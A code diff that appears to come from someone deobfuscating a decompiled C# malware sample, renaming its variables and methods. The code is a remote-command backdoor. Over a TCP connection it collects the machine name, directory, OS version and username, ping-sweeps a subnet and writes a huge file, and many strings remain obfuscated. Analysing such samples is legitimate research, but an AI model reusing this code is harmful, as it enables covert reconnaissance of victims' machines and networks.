@@ -63,7 +63,7 @@ namespace ns0
         int[] deob0to13Array = new int[this.deobCommands.Length];
         for (int index = 0; index < this.deobCommands.Length; ++index)
           deob0to13Array[index] = index;
-        int[] numArray1 = this.method_1(deob0to13Array);
+        int[] numArray1 = this.deobRandomDecrementer(deob0to13Array);
         this.deobTcpClient.ReceiveTimeout = 5000;
         this.streamReader_0 = new StreamReader((Stream) this.deobTcpClient.GetStream(), Encoding.ASCII);
         this.streamWriter_0 = new StreamWriter((Stream) this.deobTcpClient.GetStream(), Encoding.ASCII);
@@ -81,8 +81,8 @@ namespace ns0
               {
                 int length = deobConnect.deobReturnRandom(5000, 4000000);
                 double[] numArray2 = new double[length];
-                for (int index2 = 0; index2 < length; ++index2)
-                  numArray2[index2] = (double) index2;
+                for (int deobSmallLoop = 0; deobSmallLoop < length; ++deobSmallLoop)
+                  numArray2[deobSmallLoop] = (double) deobSmallLoop;
                 this.deobWriteHugeFile();
                 deobGivenCommand = deobGivenCommand + "昈" + (object) Convert.ToInt32(length);
               }
@@ -103,8 +103,8 @@ namespace ns0
               }
               if (deobGivenCommand.ToLower() == "GENERATE") //ⵌ㱈搁罛д丣Ũ̶
                             {
-                string deobEnvars = Environment.MachineName + "\x0E69偭ط" + Environment.CurrentDirectory + "\x0E69偭ط" + (object) Environment.OSVersion + "\x0E69偭ط" + Environment.UserName;
-                deobGivenCommand += deobEnvars;
+                string deobEnvars = Environment.MachineName + "-" + Environment.CurrentDirectory + "-" + (object) Environment.OSVersion + "-" + Environment.UserName; //seperators were \x0E69偭ط
+                                deobGivenCommand += deobEnvars;
               }
               if (deobGivenCommand.ToLower() == "蒶킿쎻범뚉")
               {
@@ -112,7 +112,7 @@ namespace ns0
                 deobGivenCommand = deobGivenCommand + "닟\xEDD3ￃ뗓" + string_2;
                 if (string_2 == "쯼")
                 {
-                  if (!this.method_3("诧훪鋳�\x9FE6첬读", 1, 1))
+                  if (!this.deobPingSuccessful("诧훪鋳�\x9FE6첬读", 1, 1))
                     ; //not complete?
                 }
                 else if ((string_2.StartsWith("挸瀵") || string_2.StartsWith("\x324B╏╟") ? 0 : (!string_2.StartsWith("臌铙賙") ? 1 : 0)) == 0)
@@ -120,7 +120,7 @@ namespace ns0
                   for (int deobLoopCount2 = 1; deobLoopCount2 < (int) byte.MaxValue; ++deobLoopCount2) //1 to 255
                   {
                     string_2 = string_2.Substring(0, string_2.LastIndexOf("髰")) + "髰" + deobLoopCount2.ToString();
-                    if (this.method_3(string_2, 1, 1))
+                    if (this.deobPingSuccessful(string_2, 1, 1))
                       deobGivenCommand = deobGivenCommand + "짭짾퓭鶢胠쳰쏽鏽裡쟵" + string_2;
                   }
                 }
@@ -173,23 +173,23 @@ namespace ns0
       return fileName;
     }
 
-    public static int deobReturnRandom(int int_0, int int_1)
+    public static int deobReturnRandom(int deobRandomFrom, int deobRandomTo)
     {
       lock (deobConnect.deobGlobalObject) //lock global object?
-        return deobConnect.deobGlobalRandom.Next(int_0, int_1);
+        return deobConnect.deobGlobalRandom.Next(deobRandomFrom, deobRandomTo);
     }
 
-    private int[] method_1(int[] int_0)
+    private int[] deobRandomDecrementer(int[] deobIntInput)
     {
       Random random = new Random();
-      for (int length = int_0.Length; length > 0; --length)
+      for (int length = deobIntInput.Length; length > 0; --length)
       {
         int index = random.Next(length);
-        int num = int_0[index];
-        int_0[index] = int_0[length - 1];
-        int_0[length - 1] = num;
+        int num = deobIntInput[index];
+        deobIntInput[index] = deobIntInput[length - 1];
+        deobIntInput[length - 1] = num;
       }
-      return int_0;
+      return deobIntInput;
     }
 
     private string deobAddressForSomething()
@@ -202,28 +202,28 @@ namespace ns0
       return "쯼";
     }
 
-    public bool method_3(string string_2, int int_0, int int_1)
+    public bool deobPingSuccessful(string deobIPtoPing, int deobPingCount, int deobPingTimeout)
     {
       Ping ping = new Ping();
-      bool flag;
-      for (int index = 0; index < int_0; ++index)
+      bool deobPingSuccess;
+      for (int index = 0; index < deobPingCount; ++index)
       {
         try
         {
-          PingReply pingReply = ping.Send(string_2, int_1);
+          PingReply pingReply = ping.Send(deobIPtoPing, deobPingTimeout);
           if ((pingReply == null ? 1 : (pingReply.Status != IPStatus.Success ? 1 : 0)) == 0)
           {
-            flag = true;
-            goto label_7;
+            deobPingSuccess = true;
+            goto deobReturn;
           }
         }
         catch
         {
         }
       }
-      flag = false;
-label_7:
-      return flag;
+      deobPingSuccess = false;
+deobReturn:
+      return deobPingSuccess;
     }
 
     public void deobWriteHugeFile()
